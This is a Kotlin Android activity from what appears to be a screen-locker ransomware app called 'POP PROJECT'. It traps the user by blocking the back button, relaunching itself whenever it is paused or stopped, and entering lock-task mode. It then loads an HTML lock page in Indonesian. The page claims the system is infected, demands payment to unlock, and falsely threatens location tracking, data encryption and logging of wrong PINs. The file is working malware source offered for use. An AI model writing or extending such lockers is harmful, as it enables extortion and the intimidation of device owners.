package com.sync.xxx

import android.annotation.SuppressLint
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.media.MediaPlayer
import android.webkit.WebViewClient

class LockNewActivity : Activity() {

    private lateinit var webView: WebView
    private var mediaPlayer: MediaPlayer? = null
    private var correctPin: String  = ""
    private var lockTitle: String   = "POP PROJECT"
    private var customHtml: String  = ""
    private var isReceiverRegistered = false
    private var isUnlocked = false

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.UNLOCK") {
                isUnlocked = true
                finish()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: ""
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: "POP PROJECT"
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: ""

        setupWebView()
        registerUnlockReceiver()

        try {
    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
    if (dpm.isLockTaskPermitted(packageName)) startLockTask()
} catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "startLockTask: ${e.message}")
        }
        playLockSound()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: correctPin
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: lockTitle
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: customHtml
    }

    override fun onBackPressed() {
    if (!isUnlocked) return
    super.onBackPressed()
}

    override fun onPause() {
        super.onPause()
        if (isUnlocked) return
        val handler = android.os.Handler(android.os.Looper.getMainLooper())
        handler.postDelayed({
            if (isUnlocked) return@postDelayed
            val intent = Intent(this, LockNewActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                putExtra(LockOverlayService.EXTRA_PIN, correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
                putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
            }
            startActivity(intent)
        }, 300)
    }

    override fun onStop() {
    super.onStop()
    if (isUnlocked) return
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
        val intent = Intent(this, LockNewActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            putExtra(LockOverlayService.EXTRA_PIN, correctPin)
            putExtra(LockOverlayService.EXTRA_TITLE, lockTitle)
            putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
        }
        startActivity(intent)
    }
}

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = WebView(this)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
        }
        webView.setBackgroundColor(android.graphics.Color.TRANSPARENT)
        webView.addJavascriptInterface(LockBridge(), "LockBridge")
        webView.webViewClient = WebViewClient()
        if (customHtml.isNotEmpty()) {
            webView.loadDataWithBaseURL(null, buildCustomLockHtml(customHtml), "text/html", "UTF-8", null)
        } else {
            webView.loadDataWithBaseURL(null, buildLockHtml(), "text/html", "UTF-8", null)
        }
        setContentView(webView)
    }

    private fun buildCustomLockHtml(body: String): String {
        return """<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>⚠️ LOCK SCREEN</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
      user-select: none;
    }

    body {
      min-height: 100vh;
      background: radial-gradient(circle at 20% 30%, #1a1a2e, #0a0a12);
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 16px;
    }

    /* Card utama — mirip layar HP */
    .phone {
      max-width: 380px;
      width: 100%;
      background: #0f0f1a;
      border-radius: 48px 48px 32px 32px;
      padding: 24px 20px 32px;
      box-shadow: 0 25px 50px -8px rgba(0, 0, 0, 0.9), inset 0 0 0 1px rgba(255, 255, 255, 0.04);
      backdrop-filter: blur(2px);
      transition: all 0.2s ease;
      border: 1px solid rgba(255, 70, 70, 0.15);
    }

    /* Notch + status bar (gaya HP) */
    .status-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      color: rgba(255, 255, 255, 0.6);
      font-size: 13px;
      font-weight: 500;
      letter-spacing: 0.3px;
      padding: 0 6px 10px 6px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.03);
    }
    .status-bar .time {
      color: #fff;
      font-weight: 600;
      font-size: 15px;
      background: rgba(255, 255, 255, 0.03);
      padding: 2px 14px;
      border-radius: 40px;
      backdrop-filter: blur(4px);
    }
    .status-icons {
      display: flex;
      gap: 10px;
      font-size: 14px;
    }

    /* area avatar / user */
    .user-area {
      text-align: center;
      margin: 28px 0 24px;
    }
    .avatar {
      width: 82px;
      height: 82px;
      background: linear-gradient(145deg, #ff416c, #ff4b2b);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 10px;
      box-shadow: 0 0 0 3px rgba(255, 65, 108, 0.25), 0 10px 30px -5px #ff2a2a40;
      font-size: 40px;
      font-weight: 600;
      color: white;
      text-shadow: 0 2px 10px rgba(0,0,0,0.5);
    }
    .user-area h3 {
      color: #fff;
      font-weight: 400;
      font-size: 18px;
      letter-spacing: 0.5px;
      background: linear-gradient(90deg, #f0f0f0, #b0b0b0);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    .user-area .sub {
      color: #ff6b6b;
      font-size: 12px;
      font-weight: 300;
      letter-spacing: 2px;
      text-transform: uppercase;
      background: rgba(255, 0, 0, 0.08);
      display: inline-block;
      padding: 2px 16px;
      border-radius: 40px;
      margin-top: 4px;
      backdrop-filter: blur(2px);
      border: 1px solid rgba(255, 70, 70, 0.15);
    }

    /* pesan ancaman / malware vibe */
    .warning-message {
      background: rgba(255, 0, 0, 0.06);
      border-left: 4px solid #ff3b3b;
      padding: 12px 14px;
      border-radius: 12px;
      margin: 16px 0 22px;
      backdrop-filter: blur(2px);
      box-shadow: inset 0 0 20px rgba(255, 0, 0, 0.05);
    }
    .warning-message p {
      color: #ffb3b3;
      font-size: 14px;
      font-weight: 400;
      line-height: 1.5;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .warning-message i {
      font-style: normal;
      font-size: 20px;
      filter: drop-shadow(0 0 6px #ff3b3b);
    }

    /* PIN display */
    .pin-display {
      display: flex;
      justify-content: center;
      gap: 18px;
      margin: 16px 0 22px;
    }
    .pin-dot {
      width: 16px;
      height: 16px;
      background: #2a2a3e;
      border-radius: 50%;
      transition: all 0.15s ease;
      box-shadow: inset 0 2px 4px rgba(0,0,0,0.6);
      border: 1px solid #3a3a52;
    }
    .pin-dot.filled {
      background: #ff416c;
      box-shadow: 0 0 16px #ff416c, inset 0 0 6px #ff8a8a;
      border-color: #ff6b8a;
      transform: scale(1.1);
    }

    /* keypad grid */
    .keypad {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 14px;
      margin: 16px 0 12px;
      padding: 0 4px;
    }
    .key {
      background: rgba(255, 255, 255, 0.03);
      border: 1px solid rgba(255, 255, 255, 0.04);
      color: #eee;
      font-size: 28px;
      font-weight: 400;
      padding: 18px 0;
      border-radius: 60px;
      text-align: center;
      cursor: pointer;
      transition: all 0.08s linear;
      backdrop-filter: blur(4px);
      box-shadow: 0 4px 10px rgba(0,0,0,0.3), inset 0 1px 0 rgba(255,255,255,0.02);
      letter-spacing: 1px;
    }
    .key:active {
      background: rgba(255, 70, 70, 0.2);
      transform: scale(0.94);
      border-color: #ff416c;
      box-shadow: 0 0 20px #ff416c30;
    }
    .key.empty {
      background: transparent;
      box-shadow: none;
      border: none;
      cursor: default;
      pointer-events: none;
    }
    .key .sub-label {
      display: block;
      font-size: 11px;
      color: #777;
      font-weight: 300;
      letter-spacing: 1px;
      margin-top: -4px;
    }

    /* tombol aksi bawah */
    .action-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 18px;
      padding: 0 6px;
    }
    .action-btn {
      background: rgba(255, 255, 255, 0.03);
      border: 1px solid rgba(255, 255, 255, 0.04);
      color: #aaa;
      padding: 10px 18px;
      border-radius: 40px;
      font-size: 14px;
      font-weight: 500;
      letter-spacing: 0.8px;
      cursor: pointer;
      transition: 0.15s;
      backdrop-filter: blur(4px);
      text-transform: uppercase;
    }
    .action-btn:active {
      background: rgba(255, 70, 70, 0.15);
      border-color: #ff416c;
      color: #fff;
    }
    .action-btn.danger {
      color: #ff6b6b;
      border-color: rgba(255, 0, 0, 0.2);
    }
    .action-btn.danger:active {
      background: rgba(255, 0, 0, 0.2);
      border-color: #ff3b3b;
    }

    /* pesan error / status */
    .status-msg {
      text-align: center;
      color: #ff6b6b;
      font-size: 13px;
      font-weight: 300;
      min-height: 22px;
      margin: 6px 0 4px;
      letter-spacing: 0.5px;
      background: rgba(255, 0, 0, 0.03);
      padding: 4px 0;
      border-radius: 30px;
      transition: 0.2s;
    }
    .status-msg.success {
      color: #6bff8a;
      text-shadow: 0 0 12px #00ff8040;
    }

    /* efek glitch kecil */
    .glitch {
      animation: glitch 0.3s ease;
    }
    @keyframes glitch {
      0% { transform: translate(0); opacity: 1; }
      20% { transform: translate(-3px, 2px); opacity: 0.7; }
      40% { transform: translate(3px, -2px); opacity: 0.9; }
      60% { transform: translate(-2px, 1px); }
      80% { transform: translate(2px, -1px); }
      100% { transform: translate(0); opacity: 1; }
    }

    /* footer kecil */
    .footer {
      text-align: center;
      margin-top: 18px;
      color: #3a3a52;
      font-size: 10px;
      letter-spacing: 2px;
      text-transform: uppercase;
      border-top: 1px solid rgba(255,255,255,0.02);
      padding-top: 14px;
    }
    .footer span {
      color: #ff3b3b;
      font-weight: 600;
    }

    /* responsif */
    @media (max-width: 420px) {
      .phone { border-radius: 32px; padding: 16px 14px 24px; }
      .key { font-size: 24px; padding: 14px 0; }
    }
  </style>
</head>
<body>
  <div class="phone" id="phoneContainer">
    <!-- status bar -->
    <div class="status-bar">
      <span class="time" id="clockDisplay">--:--</span>
      <div class="status-icons">
        <span>🔐</span>
        <span>🔒</span>
        <span>🚫</span>
      </div>
    </div>

    <!-- user avatar -->
    <div class="user-area">
      <div class="avatar">👾</div>
      <h3>🔒 POP PROJECT LOCKED</h3>
      <div class="sub">TEBUS DULU KALO MAU KE BUKA YATIM</div>
    </div>

    <!-- pesan ancaman -->
    <div class="warning-message" id="warningMsg">
      <p>
        <i>⚡</i> <span id="threatText">Sistem terinfeksi! Masukkan PIN untuk unlock.</span>
      </p>
    </div>

    <!-- PIN dots -->
    <div class="pin-display" id="pinDots">
      <span class="pin-dot" data-index="0"></span>
      <span class="pin-dot" data-index="1"></span>
      <span class="pin-dot" data-index="2"></span>
      <span class="pin-dot" data-index="3"></span>
    </div>

    <!-- status message -->
    <div class="status-msg" id="statusMsg">⚡ masukkan PIN 4 digit</div>

    <!-- keypad -->
    <div class="keypad" id="keypad">
      <div class="key" data-value="1">1</div>
      <div class="key" data-value="2">2</div>
      <div class="key" data-value="3">3</div>
      <div class="key" data-value="4">4</div>
      <div class="key" data-value="5">5</div>
      <div class="key" data-value="6">6</div>
      <div class="key" data-value="7">7</div>
      <div class="key" data-value="8">8</div>
      <div class="key" data-value="9">9</div>
      <div class="key empty"></div> <!-- kosong -->
      <div class="key" data-value="0">0</div>
      <div class="key" data-value="back" style="font-size:22px;">⌫</div>
    </div>

    <!-- action row -->
    <div class="action-row">
      <div class="action-btn danger" id="emergencyBtn">🚨 EMERGENCY</div>
      <div class="action-btn" id="resetBtn">↺ reset</div>
    </div>

    <!-- footer -->
    <div class="footer">
      <span>⛓️</span> LOCKED · PIN REQUIRED <span>⛓️</span>
    </div>
  </div>

  <script>
    (function() {
      // ===== PIN yang benar (kece) =====
      const CORRECT_PIN = "4321";   // ubah sesuai keinginan

      // state
      let enteredPin = "";
      const maxDigits = 4;
      const pinDots = document.querySelectorAll('.pin-dot');
      const statusMsg = document.getElementById('statusMsg');
      const threatText = document.getElementById('threatText');
      const phoneContainer = document.getElementById('phoneContainer');

      // clock
      function updateClock() {
        const now = new Date();
        const h = String(now.getHours()).padStart(2,'0');
        const m = String(now.getMinutes()).padStart(2,'0');
        document.getElementById('clockDisplay').textContent = h + ':' + m;
      }
      updateClock();
      setInterval(updateClock, 10000);

      // update PIN dots & status
      function updateUI() {
        const len = enteredPin.length;
        pinDots.forEach((dot, idx) => {
          if (idx < len) {
            dot.classList.add('filled');
          } else {
            dot.classList.remove('filled');
          }
        });

        // status message dinamis
        if (len === 0) {
          statusMsg.textContent = '⚡ masukkan PIN 4 digit';
          statusMsg.className = 'status-msg';
        } else {
          statusMsg.textContent = `🔐 ${'•'.repeat(len)}${'○'.repeat(maxDigits - len)}`;
          statusMsg.className = 'status-msg';
        }
      }

      // reset PIN (tanpa trigger unlock)
      function resetPin() {
        enteredPin = "";
        updateUI();
        // reset threat text ke default
        threatText.textContent = 'Sistem terinfeksi! Masukkan PIN untuk unlock.';
        statusMsg.textContent = '⚡ masukkan PIN 4 digit';
        statusMsg.className = 'status-msg';
        document.getElementById('warningMsg').style.borderLeftColor = '#ff3b3b';
        // hapus glitch
        phoneContainer.classList.remove('glitch');
      }

      // ===== PROSES UNLOCK =====
      function tryUnlock() {
        if (enteredPin.length !== maxDigits) {
          statusMsg.textContent = '⚠️ PIN harus 4 digit!';
          statusMsg.className = 'status-msg';
          return;
        }

        if (enteredPin === CORRECT_PIN) {
          // UNLOCK BERHASIL — gaya malware kece
          statusMsg.textContent = '✅ UNLOCKED! SELAMAT DATANG.';
          statusMsg.className = 'status-msg success';
          threatText.textContent = '🔓 Sistem pulih. Selamat datang, Master.';
          document.getElementById('warningMsg').style.borderLeftColor = '#6bff8a';
          // efek glitch sukses
          phoneContainer.classList.add('glitch');
          setTimeout(() => phoneContainer.classList.remove('glitch'), 400);

          // TAMPILKAN ALERT "MALWARE" (gaya ancaman)
          setTimeout(() => {
            alert('⚠️ [MALWARE] Selamat! Anda berhasil unlock.\n\nTapi ingat... kami selalu mengawasi 👁️');
          }, 300);

          // reset otomatis setelah 3 detik (agar kembali ke lock screen)
          setTimeout(() => {
            resetPin();
            threatText.textContent = '🔄 Sesi berakhir. Masukkan PIN lagi.';
            document.getElementById('warningMsg').style.borderLeftColor = '#ff3b3b';
            statusMsg.textContent = '⏳ lock kembali';
            statusMsg.className = 'status-msg';
          }, 3500);

        } else {
          // PIN SALAH — efek malware brutal
          statusMsg.textContent = '❌ PIN SALAH!';
          statusMsg.className = 'status-msg';
          threatText.textContent = '⚠️ PERINGATAN! PIN salah. Aktivitas dicatat.';
          document.getElementById('warningMsg').style.borderLeftColor = '#ff0000';
          phoneContainer.classList.add('glitch');
          setTimeout(() => phoneContainer.classList.remove('glitch'), 400);

          // reset PIN setelah gagal (agar harus input ulang)
          setTimeout(() => {
            resetPin();
            threatText.textContent = '⚠️ Coba lagi. Kesalahan akan dilaporkan.';
            document.getElementById('warningMsg').style.borderLeftColor = '#ff3b3b';
            statusMsg.textContent = '🔁 ulangi PIN';
            statusMsg.className = 'status-msg';
          }, 600);
        }
      }

      // ===== KEYPAD HANDLER =====
      function handleKey(value) {
        // jika sedang dalam status unlocked / proses, abaikan (kecuali reset)
        if (statusMsg.textContent.includes('UNLOCKED') || statusMsg.textContent.includes('Sesi berakhir')) {
          // tetap bisa reset via tombol, tapi keypad nonaktif sementara
          return;
        }

        if (value === 'back') {
          // hapus satu digit
          if (enteredPin.length > 0) {
            enteredPin = enteredPin.slice(0, -1);
            updateUI();
          }
          return;
        }

        // input digit (hanya angka)
        if (enteredPin.length < maxDigits) {
          enteredPin += value;
          updateUI();

          // jika sudah 4 digit, langsung coba unlock
          if (enteredPin.length === maxDigits) {
            tryUnlock();
          }
        } else {
          // jika penuh dan user tekan angka, beri efek getar (tapi tetap tidak nambah)
          statusMsg.textContent = '⚠️ PIN penuh, tekan ⌫ atau reset';
          statusMsg.className = 'status-msg';
          phoneContainer.classList.add('glitch');
          setTimeout(() => phoneContainer.classList.remove('glitch'), 200);
        }
      }

      // event listener keypad
      document.querySelectorAll('.key:not(.empty)').forEach(key => {
        key.addEventListener('click', (e) => {
          const value = key.dataset.value;
          if (value !== undefined) {
            handleKey(value);
          }
        });
      });

      // reset button
      document.getElementById('resetBtn').addEventListener('click', () => {
        resetPin();
        threatText.textContent = '🔄 Reset manual. Masukkan PIN.';
        document.getElementById('warningMsg').style.borderLeftColor = '#ff3b3b';
        statusMsg.textContent = '🔄 PIN direset';
        statusMsg.className = 'status-msg';
        phoneContainer.classList.add('glitch');
        setTimeout(() => phoneContainer.classList.remove('glitch'), 300);
      });

      // emergency button (gaya ancaman)
      document.getElementById('emergencyBtn').addEventListener('click', () => {
        alert('🚨 [EMERGENCY] Sinyal darurat dikirim!\n\n📍 Lokasi dilacak. Semua data dienkripsi.');
        threatText.textContent = '🚨 EMERGENCY MODE AKTIF!';
        document.getElementById('warningMsg').style.borderLeftColor = '#ff8800';
        statusMsg.textContent = '⛔ DARURAT!';
        statusMsg.className = 'status-msg';
        phoneContainer.classList.add('glitch');
        setTimeout(() => phoneContainer.classList.remove('glitch'), 500);
        // reset otomatis setelah 2 detik
        setTimeout(() => {
          resetPin();
          threatText.textContent = '⚠️ Kembali ke mode normal. Masukkan PIN.';
          document.getElementById('warningMsg').style.borderLeftColor = '#ff3b3b';
          statusMsg.textContent = '⚡ lanjutkan PIN';
          statusMsg.className = 'status-msg';
        }, 2000);
      });

      // inisialisasi
      resetPin();

      // tambahan: support keyboard (untuk demo di PC)
      document.addEventListener('keydown', (e) => {
        if (e.key >= '0' && e.key <= '9') {
          handleKey(e.key);
        } else if (e.key === 'Backspace') {
          handleKey('back');
        } else if (e.key === 'Enter') {
          // jika pin belum 4 digit, tidak berlaku
          if (enteredPin.length === maxDigits) {
            tryUnlock();
          } else {
            statusMsg.textContent = '⏳ PIN belum lengkap';
            statusMsg.className = 'status-msg';
          }
        }
      });

    })();
  </script>
</body>
</html>
"""
    }
}